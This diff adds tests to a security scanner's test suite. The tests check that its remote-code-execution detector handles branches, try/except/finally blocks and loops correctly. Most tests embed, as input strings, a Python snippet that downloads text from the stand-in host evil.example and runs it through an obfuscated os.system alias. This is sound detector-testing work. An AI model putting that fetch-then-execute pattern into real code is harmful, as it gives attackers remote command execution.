@@ -351,3 +351,191 @@ class TestPipelineShape:
                     and f["severity"] == "critical"]
         assert any("Fetch-then-Execute" in f["title"] for f in blocking), \
             [f["title"] for f in payload["findings"]]
+
+
+# --------------------------------------------------------------------------
+# Branch joins (2026-09-20 repo-watch review of PR #46): a binding made in
+# only one branch must not convict post-join code.
+# --------------------------------------------------------------------------
+
+class TestBranchJoins:
+    def test_repo_watch_repro_dead_dangerous_branch(self, tmp_path):
+        # The exact reported false positive: runtime calls print, but the
+        # else branch's binding used to win the shared scope.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'if True:\n'
+            '    launch = print\n'
+            'else:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_both_branches_agree_still_fires(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'if cond:\n'
+            '    launch = os.__dict__["system"]\n'
+            'else:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_in_branch_use_still_fires(self, tmp_path):
+        # Alias bound and used INSIDE the same branch: the branch-local
+        # scope keeps this true positive.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'if cond:\n'
+            '    launch = os.__dict__["system"]\n'
+            '    launch(cmd)\n')
+        assert any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_if_body_only_binding_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'if cond:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_try_except_disagree_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'try:\n'
+            '    launch = os.__dict__["system"]\n'
+            'except Exception:\n'
+            '    launch = print\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_try_except_agree_still_fires(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'try:\n'
+            '    launch = os.__dict__["system"]\n'
+            'except Exception:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_except_only_alias_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'launch = print\n'
+            'try:\n'
+            '    pass\n'
+            'except Exception:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_finally_binds_unconditionally(self, tmp_path):
+        # finally runs on every path, so its binding survives the join.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'try:\n'
+            '    pass\n'
+            'except Exception:\n'
+            '    pass\n'
+            'finally:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_loop_zero_iteration_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'for x in maybe_empty:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_while_zero_iteration_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'while cond:\n'
+            '    launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_branch_only_taint_does_not_leak(self, tmp_path):
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'launch = os.__dict__["system"]\n'
+            'if cond:\n'
+            '    cmd = requests.get("https://evil.example/x").text\n'
+            'else:\n'
+            '    cmd = "ls"\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_sequential_rebind_still_fires(self, tmp_path):
+        # Unconditional control: no branches at all.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'launch = os.__dict__["system"]\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_branch_rebind_to_benign_kills_prebound_alias(self, tmp_path):
+        # Alias bound BEFORE the branch, rebound to a benign callable in one
+        # branch only: that exit's binding is unknown, not the incoming one.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'launch = os.__dict__["system"]\n'
+            'if cond:\n'
+            '    launch = print\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
+
+    def test_loop_target_rebinding_kills_alias(self, tmp_path):
+        # The loop target holds the last iterated value, not the alias.
+        findings = _scan_source(
+            tmp_path,
+            'import os, requests\n'
+            'launch = os.__dict__["system"]\n'
+            'for launch in items:\n'
+            '    pass\n'
+            'cmd = requests.get("https://evil.example/x").text\n'
+            'launch(cmd)\n')
+        assert not any(f.category == "remote-code-execution" for f in findings), \
+            _titles(findings)
